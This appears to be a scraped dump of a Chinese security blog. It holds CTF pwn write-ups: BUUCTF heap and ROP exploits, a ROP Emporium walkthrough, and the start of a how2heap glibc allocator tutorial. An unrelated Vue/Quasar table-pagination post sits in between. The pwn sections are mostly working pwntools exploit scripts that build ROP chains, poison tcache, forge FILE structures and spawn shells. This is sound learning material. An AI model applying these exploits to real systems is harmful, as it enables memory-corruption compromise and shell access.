corrupt top chunk add(0x1000) # old_top -\u0026gt; unsorted add(0x400) # slice old top show() ru(\u0026#39;a\u0026#39;*8) base = uu64(ru(\u0026#39;\\n\u0026#39;))-1640-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) system = base + libc.sym[\u0026#39;system\u0026#39;] io_list_all = base + libc.sym[\u0026#39;_IO_list_all\u0026#39;] \u0026#39;\u0026#39;\u0026#39;large chunk: 0x56512e53b0c0: 0x0000000000000000 0x0000000000000411 0x56512e53b0d0: 0x6161616161616161 0x00007f01ea979188 0x56512e53b0e0: 0x000056512e53b0c0 0x000056512e53b0c0 \u0026#39;\u0026#39;\u0026#39; edit(0x10,\u0026#39;a\u0026#39;*0x10) show() ru(\u0026#39;a\u0026#39;*0x10) heap = uu64(ru(\u0026#39;\\n\u0026#39;)) - 0xc0 leak(\u0026#39;heap\u0026#39;,heap) # jump_table+0x18 payload = flat(0,0,0,system).ljust(0x400,\u0026#39;\\x00\u0026#39;) # _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable payload += useless + flat(\u0026#39;/bin/sh\\x00\u0026#39;,0x61,0,io_list_all-0x10,2,3,\u0026#39;\\x00\u0026#39;*(0xd8-0x30),heap+0xd0) edit(0x1000,payload) sla(\u0026#39;choice :\u0026#39;,\u0026#39;1\u0026#39;) ciscn_2019_final_2 # 本题需要将读入的 flag 的 fd 改为 666。\n存在 tcache double free 漏洞，首先分配多个 short，利用 double free 泄露堆地址。然后 tcache 投毒，伪造 chunk0 大小，并释放进入 unsorted bin 泄露 libc。注意释放前先填满 tcache 才能进入 unsorted bin。\n接下来继续投毒使 int 的 fd 指向 fileno，再次 double free 泄露 chunk0 的 mem 指针地址。最后投毒指向 chunk0 的 mem 指针地址，再申请三次就可以修改 fileno 了。\nadd(1,0x30) free(1) add(2,0x20) add(2,0x20) add(2,0x20) # total size: 0x90 add(2,0x20) # prevent merging free(2) add(1,0x30) free(2) show(2) ru(\u0026#39;number :\u0026#39;) chunk0 = int(ru(\u0026#39;\\n\u0026#39;))-0xa0 leak(\u0026#39;chunk0\u0026#39;,chunk0) add(2,chunk0) # poisoning add(2,0xdeadbeef) add(2,0x91) # chunk0 for i in range(7): # fill tcache free(1) add(2,0x20) free(1) # unsorted show(1) ru(\u0026#39;number :\u0026#39;) base = int(ru(\u0026#39;\\n\u0026#39;))-96-libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x10 leak(\u0026#39;base\u0026#39;,base) fileno = base+libc.sym[\u0026#39;_IO_2_1_stdin_\u0026#39;]+0x70 add(1,fileno) # poisoning add(1,0x30) free(1) add(2,0x20) free(1) show(1) ru(\u0026#39;number :\u0026#39;) chunk0_mem = int(ru(\u0026#39;\\n\u0026#39;))-0x30 add(1,chunk0_mem) # poisoning add(1,0xdeadbeef) add(1,0xdeadbeef) add(1,666) sla(\u0026#39;\u0026gt;\u0026#39;,4) 强网杯_拟态_stkof # 采用了拟态防御，简单来说就是要用同一个脚本同时在 32 位和 64 位程序上 getshell 且两个程序的输出必须相同。\n首先检查两个二进制文件，漏洞都是简单的栈溢出并且空间很大。区别在于可以溢出的长度相差 8 字节，这 8 字节应该就是能够用同一个脚本的关键所在。\n容易想到利用常规 ret2syscall，分别写出 32 位和 64 位脚本：\npop_eax = 0x80a8af6 pop_dcb = 0x806e9f1 int_80 = 0x80495a3 data = 0x80d7000 chain86 = [ \u0026#39;a\u0026#39;*(0x10c+4), elf.sym[\u0026#39;read\u0026#39;], pop_dcb,0,data,0x100, pop_dcb,0,0,data, pop_eax,0xb, int_80 ] payload = flat(chain86) sa(\u0026#39;?\u0026#39;,payload) s(\u0026#39;/bin/sh\\x00\u0026#39;) pop_rax = 0x43b97c pop_rdi = 0x4005f6 pop_rsi = 0x405895 pop_rdx = 0x43b9d5 syscall = 0x461645 data = 0x6a4e40 chain64 = [ \u0026#39;a\u0026#39;*(0x110+8), pop_rax,0,pop_rdi,0, pop_rsi,data,pop_rdx,0x100, syscall, pop_rax,59,pop_rdi,data, pop_rsi,0,pop_rdx,0, syscall ] payload = flat(chain64) sa(\u0026#39;?\u0026#39;,payload) s(\u0026#39;/bin/sh\\x00\u0026#39;) 那么怎么把两者合并呢？这就需要用到 8 字节的栈溢出长度差，在这 8 字节中，我们分别调整 32 位程序和 64 位程序的 esp 和 rsp 指针，使得经过调整后栈上的返回地址指向 payload 的不同部分。\n这里需要注意的是，栈变量在 32 位下位于 esp+0xc，在 64 位下位于 rsp+0x0，在计算需要填充的 padding 时需要考虑到这一点。\npop_eax = 0x80a8af6 pop_dcb = 0x806e9f1 int_80 = 0x80495a3 data86 = 0x80d7000 read = 0x806c8e0 add_esp_20 = 0x80a69f2 offset86 = 0x20-0xc # esp+0xc chain86 = [ \u0026#39;a\u0026#39;*offset86, read, pop_dcb,0,data86,0x8, pop_dcb,0,0,data86, pop_eax,0xb, int_80 ] payload86 = flat(chain86,word_size=32) pop_rax = 0x43b97c pop_rdi = 0x4005f6 pop_rsi = 0x405895 pop_rdx = 0x43b9d5 syscall = 0x461645 data64 = 0x6a4e40 add_rsp_80 = 0x40cd17 offset64 = 0x80-len(payload86) # rsp+0x0 print hex(offset64) chain64 = [ \u0026#39;a\u0026#39;*offset64, pop_rax,0,pop_rdi,0, pop_rsi,data64,pop_rdx,0x100, syscall, pop_rax,59,pop_rdi,data64, pop_rsi,0,pop_rdx,0, syscall ] payload64 = flat(chain64,word_size=64) payload = \u0026#39;a\u0026#39;*0x110 + (p32(add_esp_20)+\u0026#39;aaaa\u0026#39;) + p64(add_rsp_80) + payload86 + payload64 sa(\u0026#39;?\u0026#39;,payload) s(\u0026#39;/bin/sh\\x00\u0026#39;) axb_2019_heap # 利用格式化字符串漏洞泄露堆地址和 libc。随后，可以发现 edit 时存在 off by one，我们在构造 unlink 的 fake chunk 时，该漏洞会导致修改下一个 chunk 的 prev_size 后会覆盖掉它的 size 字段最后一个字节。但是同样的，我们也可以利用该漏洞手动恢复最后一个字节。，这里是 0xa0。\n接下来就常规 unlink，覆盖 free_hook 为 system，注意维持原 note 数组结构。\nsla(\u0026#39;name:\u0026#39;,\u0026#39;%11$p.%15$p\u0026#39;) ru(\u0026#39;,\u0026#39;) heap = int(ru(\u0026#39;.\u0026#39;),16)-0x1186 base = int(ru(\u0026#39;\\n\u0026#39;),16)-0x20830 leak(\u0026#39;heap\u0026#39;,heap) leak(\u0026#39;base\u0026#39;,base) note = heap+0x202060 system = base+libc.sym[\u0026#39;system\u0026#39;] free_hook = base+libc.sym[\u0026#39;__free_hook\u0026#39;] add(0,0x98) add(1,0x98) add(2,0x90) add(3,0x90,\u0026#39;/bin/sh\\x00\u0026#39;) fd = note-0x18 bk = note-0x10 fake = flat(0,0x91,fd,bk).ljust(0x90,\u0026#39;\\x00\u0026#39;) + p64(0x90)+\u0026#39;\\xa0\u0026#39; edit(0,fake) free(1) edit(0,flat(0,0,0,free_hook,0x98)) edit(0,p64(system)) free(3) ","date":"2019-12-14","permalink":"/posts/buu-pwn/","section":"Posts","summary":"\u003cp\u003e从今天起，我也是 Pwn 🐕 了。\u003c/p\u003e","title":"BUUCTF Pwn 练习记录"},{"content":"QTable 是 Quasar Framework 的组件之一，功能比较复杂。这篇文章介绍了如何配合服务端分页来使用 QTable 组件。\n参考了 Quasar 官方文档。\n背景 # 最近接的一个项目中有一个页面需要加载一个表格，表格的数据是通过异步调用从后端获取的。由于数据量较大，可能需要分页、排序等操作，我选择使用 QTable 组件，其核心属性包含：\ndata：数组，按行存放表格数据，每个对象为一行 columns：数组，每个元素表示一列的属性，例如列名、该列的样式、是否能够排序等等 row-key：某一列的 name 属性，用来唯一标识一行 pagination.sync：一个对象，包含了分页器的一些属性 这里因为要处理分页问题，我着重关注的是 pagination.sync 属性，官方文档中的例子显示它长这样：\npagination: { sortBy: \u0026#39;name\u0026#39;, descending: false, page: 2, rowsPerPage: 3 // rowsNumber: xx if getting data from a server } sortBy 字段表示排序的关键字，descending 表示是否是降序排序，page 表示当前所在页，rowsPerPage 表示当前选择的每页最大行数。用户操作分页器时，pagination 也会相应地改变。\n问题 # 在后端，当我请求表格数据时，需要提供两个参数 pageNum 和 pageSize，含义与 page 和 rowPerPage 相同。我们考虑以下场景：\n当前用户共有 11 条表格数据。假设用户选择每页显示 10 条数据，那么前端将发送请求 ?pageNum=1\u0026amp;pageSize=10 并拿到第 1 页的 10 条数据。然而此时，QTable 会发现只获取了 10 条数据，因此分页器的 下一页 按钮处于不可用状态。这样一来，我们无法通过用户操作触发 ?pageNum=2\u0026amp;pageSize=10 请求，因此无法获取第 11 条数据。\n换而言之，QTable 的前端分页与后端分页无法兼容，但是后者是必须的，因为数据量非常大，不可能通过一次调用发送。\n解决方案 # 幸运的是，在 这里 我发现，Quasar 的开发者早就想到了这个问题，特地为服务端分页作了准备。回顾 pagination 的结构，我们还没有解释 rowsNumber 的作用：声明该字段代表我们将采用后端分页的方式，而它的含义就是表格数据的总行数（在上例中是 11）。这个值是后端返回给我们的。\n同时，我们还需要给 q-table 组件添加属性 @request。如果由于页数切换 / 排序 / 搜索导致当前页表格数据变化，那么就会触发 request 事件，执行对应的函数。看起来非常容易理解，然而这里却有坑点。\n在我的项目中设置了：\n:pagination.sync=\u0026#34;pagination\u0026#34; @request=\u0026#34;getList\u0026#34; 那么 getList 函数将接收到参数 props。此时，我们拥有两个 pagination:\nthis.pagination （用于设置 pagination.sync 属性） props.pagination 起初我采用了如下方式发送请求：\npageNum=${this.pagination.page}\u0026amp;pageSize=${this.pagination.rowsPerPage} 结果发现切到下一页时，尽管请求成功但表格并不变化，调试发现 this.pagination 并没有变！真正变化的是 props.pagination，因此正解是将请求中的 this 替换为 props。\n总结 # 所以，在 QTable 中使用服务端分页的正确姿势如下：\n设置 q-table 组件的 pagination.sync 属性，注意必须有 rowsNumber 字段 设置 q-table 组件的 @request 属性，在这里执行异步调用获取数据 而在 @request 对应的函数中，需要：\n利用 props.pagination 发送请求获取数据 用后端返回的值更新 this.pagination 还可以加个 loading ","date":"2019-12-12","permalink":"/posts/qtable-ss-pagination/","section":"Posts","summary":"\u003cp\u003eQTable 是 Quasar Framework 的组件之一，功能比较复杂。这篇文章介绍了如何配合服务端分页来使用 QTable 组件。\u003c/p\u003e","title":"术业专攻：QTable 服务端分页实践"},{"content":"针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。\nret2win # 最简单的 ret2text，给了到 ebp 的偏移量，只需要找到函数 ret2win 的地址返回过去即可。\nfrom pwn import * p = process(\u0026#39;./ret2win\u0026#39;) elf = ELF(\u0026#39;./ret2win\u0026#39;) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) payload = \u0026#39;a\u0026#39;*0x28 + p64(elf.symbols[\u0026#39;ret2win\u0026#39;]) p.sendline(payload) p.interactive() split # 拆开了 system 和 /bin/cat flag.txt，因此找到两者地址，准备好参数后返回到 system 上即可。\n注意在 32 位上，只需要先放 system 地址，随后填充 4 字节返回地址，再放 /bin/cat flag.txt 地址即可。而 64 位上传参需要控制 rdi 寄存器，因此需要 pop rdi; ret。\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = process(\u0026#39;./split\u0026#39;) elf = ELF(\u0026#39;./split\u0026#39;) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) pop_rdi_ret = 0x400883 bin_cat_flag = 0x601060 payload = flat([\u0026#39;a\u0026#39;*0x28, pop_rdi_ret, bin_cat_flag, elf.plt[\u0026#39;system\u0026#39;]]) p.sendline(payload) p.interactive() callme # 题目要求是依次调用 callme_one(1,2,3)，callme_two(1,2,3)，callme_three(1,2,3)。要控制三个参数就需要三个寄存器 rdi rsi rdx，我们恰好能找到一条语句：\n0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret 之后就是布置好参数了：\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = process(\u0026#39;./callme\u0026#39;) elf = ELF(\u0026#39;./callme\u0026#39;) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) pop_rdi_rsi_rdx_ret = 0x401ab0 payload = flat([\u0026#39;a\u0026#39;*0x28, pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt[\u0026#39;callme_one\u0026#39;], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt[\u0026#39;callme_two\u0026#39;], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt[\u0026#39;callme_three\u0026#39;]]) p.sendline(payload) p.interactive() write4 # /bin/cat flag.txt 字符串彻底消失了，题目提示我们需要自己向内存中写入该字符串。checksec 可知 GOT 表可写。\n为了写 GOT 表，首先要控制寄存器，然后通过 mov [reg], reg 这样的语句来执行写操作，因此我们搜索一下：\n$ ROPgadget --binary write4 --only \u0026#39;mov|pop|ret\u0026#39; Gadgets information ============================================================ 0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret 0x0000000000400821 : mov dword ptr [rsi], edi ; ret 0x00000000004007ae : mov eax, 0 ; pop rbp ; ret 0x0000000000400820 : mov qword ptr [r14], r15 ; ret 0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400890 : pop r14 ; pop r15 ; ret 0x0000000000400892 : pop r15 ; ret 0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret 0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop rbp ; ret 0x0000000000400893 : pop rdi ; ret 0x0000000000400891 : pop rsi ; pop r15 ; ret 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004005b9 : ret 按照上述需求，我们可以选择布置好栈，执行 pop r14 ; pop r15 ; ret 控制 r14 和 r15，随后 mov qword ptr [r14], r15 ; ret 进行写操作，最后 pop rdi ; ret 把写好的 /bin/sh（总觉得拿到 shell 比读到 flag 更厉害一点）作为参数传入，需要注意的是字符串需要 8 字节对齐。\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = process(\u0026#39;./write4\u0026#39;) elf = ELF(\u0026#39;./write4\u0026#39;) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) got_start = 0x601000 pop_r14_r15_ret = 0x400890 mov_r14_r15_ret = 0x400820 pop_rdi_ret = 0x400893 payload = flat([\u0026#39;a\u0026#39;*0x28, pop_r14_r15_ret, got_start,\u0026#39;/bin/sh\u0026#39;.ljust(8,\u0026#39;\\x00\u0026#39;), mov_r14_r15_ret, pop_rdi_ret, got_start, elf.plt[\u0026#39;system\u0026#39;]]) p.sendline(payload) p.interactive() badchars # 题目屏蔽了一些关键字符，并提示了 XOR，也就是说我们可以先写入被异或的关键字符，随后通过 gadgets 把它们异或回来。\n题目告诉了我们被屏蔽的字符，所以我们可以先通过 --badbytes 选项避免指令地址中含有这些字符：\n$ ROPgadget --binary badchars --only \u0026#39;mov|pop|ret\u0026#39; --badbytes \u0026#39;62|69|63|2f|20|66|6e|73\u0026#39; 随后，我们构造异或字符串，与 2 异或即可：\ns = \u0026#39;/bin/sh\u0026#39;.ljust(8,\u0026#39;\\x00\u0026#39;) for i in range(len(s)): print hex(ord(s[i]) ^ 2) 得到：\nbin_sh = 0x026a712d6c6b602d 注意后面会被认为是小端法，所以这里倒序写。\n然后，我们挑选如下的 gadgets：\npop r12 ; pop r13 ; ret mov qword ptr [r13], r12 ; ret pop r14 ; pop r15 ; ret xor byte ptr [r15], r14b ; ret pop rdi ; ret 第 1,2,5 行和前面一样，而第 3-4 行控制寄存器 r14 和 r15 的值，使得 r14=2（r14b 即 r14 的低 8 位），r15 存放我们刚刚写入的被异或的字符串地址，随后进行 8 次异或即可恢复出 /bin/sh\\x00 来。\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = process(\u0026#39;./badchars\u0026#39;) elf = ELF(\u0026#39;./badchars\u0026#39;) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) bin_sh = 0x026a712d6c6b602d got_start = 0x601000 pop_r12_r13_ret = 0x400b3b mov_r13_r12_ret = 0x400b34 pop_r14_r15_ret = 0x400b40 xor_r15_r14b_ret = 0x400b30 pop_rdi_ret = 0x400b39 payload = flat([\u0026#39;a\u0026#39;*0x28, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret]) for i in range(8): payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret]) payload += flat([pop_rdi_ret, got_start, elf.plt[\u0026#39;system\u0026#39;]]) p.sendline(payload) p.interactive() fluff # 本题减少了一些 gadget，我们不得不间接地通过寄存器写内存。注意这里用 ROPgadget 很难找到合适的 gadget，需要加个 --depth 参数。\n$ ROPgadget --binary fluff --depth 20 在众多 gadget 中要找到有用的，我们的思路还是如何去写内存。按照之前经验，还是需要 mov [reg], reg 的语句，这里就有一个：\n0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 但是很不巧，没有 pop r10; pop r11; ret 这么好的 gadget 了，我们只能另辟蹊径去控制这两个寄存器。首先我们要把 GOT 表地址放进 r10。然而我们连 xor r10, reg 这样的语句都没有，非常难受（xor [r10], reg 是没有用的，因为无法改变 r10 本身）。\n但是我们注意到，有这样一个 gadget：\n0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret 这里可以交换 r11 和 r10 的值，那么我们是不是可以通过控制 r11，然后最后让它和 r10 交换从而控制 r10 呢？\n我们发现是可以的，因为有：\n0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret 这两个 gadget 让我们想到：我们可以先通过第一个 gadget 清零 r11，然后用第二个 gadget 让 r11 和 r12 异或，此时就等同于 mov r11, r12 了。而 r12 是很好控制的：\n0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret 这样就可以构造 ROP 链先把地址写入 r10：\ngot_start = 0x601000 xor_r11_r11 = 0x400822 pop_r12 = 0x400832 xor_r11_r12 = 0x40082f xchg_r11_r10 = 0x400840 payload = flat([\u0026#39;a\u0026#39;*40, xor_r11_r11,\u0026#39;a\u0026#39;*8, pop_r12, got_start, xor_r11_r12,\u0026#39;a\u0026#39;*8, xchg_r11_r10,\u0026#39;a\u0026#39;*8]) 这里的 'a'*8 是为了解决后面的无用 pop。\n第二步，向 r11 写入 /bin/sh\\x00，其实和上面同理：\npayload += flat([xor_r11_r11,\u0026#39;a\u0026#39;*8, pop_r12,\u0026#39;/bin/sh\u0026#39;.ljust(8,\u0026#39;\\x00\u0026#39;), xor_r11_r12,\u0026#39;a\u0026#39;*8]) 第三步，向 r10 中的地址写入 r11 中的数据，需要注意的是由于该 gadget 后半部分会 pop r12 并且将 r12 也去和 r10 中的地址存放的值异或，此时我们必须控制 r12 为 0：\nmov_r10_r11 = 0x40084e pop_rdi_ret = 0x4008c3 payload += flat([mov_r10_r11,\u0026#39;a\u0026#39;*8, 0, pop_rdi_ret, got_start, elf.plt[\u0026#39;system\u0026#39;]]) pivot # stack pivoting 就是在栈空间较小的情况下，把 esp 移到别的地方去，这样就能有更多空间写 ROP 链了。\n这一关大意是要调用 libpivot.so 中的 ret2win 函数，也就是第一关的那个。此外，还有个 uselessFunction 里调用了 libpivot.so 里的 foothold_function。\nIDA 得到的源码如下：\nint __cdecl main(int argc, const char **argv, const char **envp) { char *ptr; // ST08_8 setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(\u0026#34;pivot by ROP Emporium\u0026#34;); puts(\u0026#34;64bits\\n\u0026#34;); ptr = (char *)malloc(0x1000000uLL); pwnme(ptr + 16776960); free(ptr); puts(\u0026#34;\\nExiting\u0026#34;); return 0; } char *__fastcall pwnme(char *a1) { char s; // [rsp+10h] [rbp-20h] memset(\u0026amp;s, 0, 0x20uLL); puts(\u0026#34;Call ret2win() from libpivot.so\u0026#34;); printf(\u0026#34;The Old Gods kindly bestow upon you a place to pivot: %p\\n\u0026#34;, a1); puts(\u0026#34;Send your second chain now and it will land there\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); fgets(a1, 256, stdin); puts(\u0026#34;Now kindly send your stack smash\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;, 256LL); return fgets(\u0026amp;s, 64, stdin); } 注意到这里的 a1 会被打印出来，随后被 fgets 写入。我们想尝试让 rsp 指向 a1 来改变 rsp 位置。这个比较简单，只需要 gadget：\npop rax; ret xchg rax, rsp; ret 通过 pop rax 把 a1 的地址写入 rax，然后交换，那么 rsp 就指向了 a1，我们完成了 stack pivoting。\n这题容易搞混的地方是，我们的思路是先填 first stage 进行 stack pivoting（也就是上述过程），再填 second stage 调用 ret2win，但是程序中输入的顺序是相反的。\n下面我们来看 second stage，也就是考虑我们要先输入什么。我们最终肯定是想返回到 ret2win，但是我们不知道它的地址。checksec libpivot.so 可以发现还开启了 ASLR。因此可以想到这里 foothold_function 就是用来定位用的。\n首先（通过 .plt）调用一次 foothold_function 更新其 .got.plt，随后将这个 .got.plt 项的地址 pop 给 rax，接着读取 [rax] 也就是这个 .got.plt 项的内容，即得到了 foothold_function 真实地址。\n最后，可以根据它在 libpivot.so 中到 ret2win 的相对偏移来拿到 ret2win 的真实地址。这个相对偏移可以通过 nm libpivot.so 得到：前者在 0x0970，后者在 0x0abe，相差 0x14e。最后我们还是利用 gadget 计算出 ret2win 的真实地址后，call 一下即可。\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = process(\u0026#39;./pivot\u0026#39;) elf = ELF(\u0026#39;./pivot\u0026#39;) p.recvuntil(\u0026#39;pivot:\u0026#39;) a1 = int(p.recvuntil(\u0026#39;\\n\u0026#39;), 16) print hex(a1) foothold_plt = elf.plt[\u0026#39;foothold_function\u0026#39;] foothold_got = elf.got[\u0026#39;foothold_function\u0026#39;] pop_rax_ret = 0x400b00 mov_rax_rax = 0x400b05 pop_rbp_ret = 0x400900 add_rax_rbp = 0x400b09 call_rax = 0x40098e payload = flat([foothold_plt, pop_rax_ret, foothold_got, mov_rax_rax, pop_rbp_ret, 0x14e, add_rax_rbp, call_rax]) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) p.sendline(payload) xchg_rax_rsp = 0x400b02 payload = flat([\u0026#39;a\u0026#39;*0x28, pop_rax_ret, a1, xchg_rax_rsp]) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) p.sendline(payload) p.interactive() ret2csu # 这题要求我们调用 ret2win 但是第三个参数必须是 0xdeadcafebabebeef，并且 ROPgadget 几乎找不到有用的 gadget 比如 pop rdx; ret。结合题目名可知本题需要采用 ret2csu 的技巧。\n在 __libc_csu_init 中，有 gadget1：\npop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn 和 gadget2：\nmov rdx, r15 mov rsi, r14 mov edi, r13d call qword ptr [r12+rbx*8] 可以看到，这里 rdx, rsi, edi 正好是 64 位下函数的前三个参数，而它们的值在这里来源于 r15, r14, r13d，后三者又恰好可以被 gadget1 控制；而最后一句 call 中的 r12 和 rbx 我们同样可以在 gadget1 中控制。\n然而，gadget2 不是以 ret 结尾的，这样我们必须考虑它后面的汇编代码依旧能正常执行下去：\nadd rbx, 1 cmp rbp, rbx jnz short loc_400880 add rsp, 8 pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn 这里为了让它继续向下执行，我们不妨让 rbx=0; rbp=1；至于下面多余的 pop 就用填充处理掉就好了。\n最后还有一个 call qword ptr [r12+rbx*8] 是我们可控的，但是这里尝试调用 ret2win 是会引起段错误的，不能直接调用。我们只有不引起段错误，才能让 gadget2 成功执行到 ret，那么我们就想随便调用一个不会改变 rdx 的值的函数。\n例如，可以调用 .dynamic 段的 _fini，这个函数非常简单：\nsub rsp,0x8 add rsp,0x8 ret 那么我们控制 r12 指向 _fini 即可，因为 rbx 会被我们设置为 0 所以不用考虑。注意是指向，也就是说 [r12] 才是 _fini 的地址，后者可以 gdb 中 info func 得到在 0x4008b4，但是我们需要赋值给 r12 的实际上是指向 0x4008b4 这个地址的指针。\n我们可以这样看：\npwndbg\u0026gt; x/20x \u0026amp;_DYNAMIC 0x600e20: 0x00000001 0x00000000 0x00000001 0x00000000 0x600e30: 0x0000000c 0x00000000 0x00400560 0x00000000 0x600e40: 0x0000000d 0x00000000 0x004008b4 0x00000000 0x600e50: 0x00000019 0x00000000 0x00600e10 0x00000000 0x600e60: 0x0000001b 0x00000000 0x00000008 0x00000000 可以看到在 0x600e48 的指针指向 0x4008b4，这就是我们要赋值给 r12 的值。\nfrom pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;DEBUG\u0026#39;) p = process(\u0026#39;./ret2csu\u0026#39;) elf = ELF(\u0026#39;./ret2csu\u0026#39;) p.recvuntil(\u0026#39;\u0026gt;\u0026#39;) ret2win = elf.symbols[\u0026#39;ret2win\u0026#39;] gadget1 = 0x40089a gadget2 = 0x400880 fini_p = 0x600e48 arg3 = 0xdeadcafebabebeef payload = flat([\u0026#39;a\u0026#39;*0x28, gadget1, 0, 1, fini_p, 0, 0, arg3, gadget2,0,0,0,0,0,0,0, ret2win]) p.sendline(payload) p.interactive() ","date":"2019-12-09","permalink":"/posts/rop-emporium/","section":"Posts","summary":"\u003cp\u003e针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。\u003c/p\u003e","title":"ROP Emporium 练习记录"},{"content":"距离文章发布两个多月后，终于更新完啦！\nfirst_fit # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file doesn\u0026#39;t demonstrate an attack, but shows the nature of glibc\u0026#39;s allocator.\\n\u0026#34;); fprintf(stderr,\u0026#34;glibc uses a first-fit algorithm to select a free chunk.\\n\u0026#34;); fprintf(stderr,\u0026#34;If a chunk is free and large enough, malloc will select this chunk.\\n\u0026#34;); fprintf(stderr,\u0026#34;This can be exploited in a use-after-free situation.\\n\u0026#34;); fprintf(stderr,\u0026#34;Allocating 2 buffers. They can be large, don\u0026#39;t have to be fastbin.\\n\u0026#34;); char* a = malloc(0x512); char* b = malloc(0x256); char* c; fprintf(stderr,\u0026#34;1st malloc(0x512): %p\\n\u0026#34;, a); fprintf(stderr,\u0026#34;2nd malloc(0x256): %p\\n\u0026#34;, b); fprintf(stderr,\u0026#34;we could continue mallocing here...\\n\u0026#34;); fprintf(stderr,\u0026#34;now let\u0026#39;s put a string at a that we can read later \\\u0026#34;this is A!\\\u0026#34;\\n\u0026#34;); strcpy(a,\u0026#34;this is A!\u0026#34;); fprintf(stderr,\u0026#34;first allocation %p points to %s\\n\u0026#34;, a, a); fprintf(stderr,\u0026#34;Freeing the first one...\\n\u0026#34;); free(a); fprintf(stderr,\u0026#34;We don\u0026#39;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\\n\u0026#34;, a); fprintf(stderr,\u0026#34;So, let\u0026#39;s allocate 0x500 bytes\\n\u0026#34;); c = malloc(0x500); fprintf(stderr,\u0026#34;3rd malloc(0x500): %p\\n\u0026#34;, c); fprintf(stderr,\u0026#34;And put a different string here, \\\u0026#34;this is C!\\\u0026#34;\\n\u0026#34;); strcpy(c,\u0026#34;this is C!\u0026#34;); fprintf(stderr,\u0026#34;3rd allocation %p points to %s\\n\u0026#34;, c, c); fprintf(stderr,\u0026#34;first allocation %p points to %s\\n\u0026#34;, a, a); fprintf(stderr,\u0026#34;If we reuse the first allocation, it now holds the data from the third allocation.\\n\u0026#34;); } 输出：\nThis file doesn\u0026#39;t demonstrate an attack, but shows the nature of glibc\u0026#39;s allocator. glibc uses a first-fit algorithm to select a free chunk. If a chunk is free and large enough, malloc will select this chunk. This can be exploited in a use-after-free situation. Allocating 2 buffers. They can be large, don\u0026#39;t have to be fastbin. 1st malloc(0x512): 0x121f010 2nd malloc(0x256): 0x121f530 we could continue mallocing here... now let\u0026#39;s put a string at a that we can read later\u0026#34;this is A!\u0026#34; first allocation 0x121f010 points to this is A! Freeing the first one... We don\u0026#39;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x121f010 So, let\u0026#39;s allocate 0x500 bytes 3rd malloc(0x500): 0x121f010 And put a different string here, \u0026#34;this is C!\u0026#34; 3rd allocation 0x121f010 points to this is C! first allocation 0x121f010 points to this is C! If we reuse the first allocation, it now holds the data from the third allocation. 这个例子很简单，由于初始分配给 a 的 0x512 字节刚刚被释放，此时分配一块小于 0x512 字节的内存必定会使用刚才 a 使用的内存区域。注意如果最后使用被释放的指针 a，那么它仍然指向 this is C! 字符串，这就是通常说的 use after free。\nfastbin_dup # 源码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { fprintf(stderr,\u0026#34;This file demonstrates a simple double-free attack with fastbins.\\n\u0026#34;); fprintf(stderr,\u0026#34;Allocating 3 buffers.\\n\u0026#34;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); 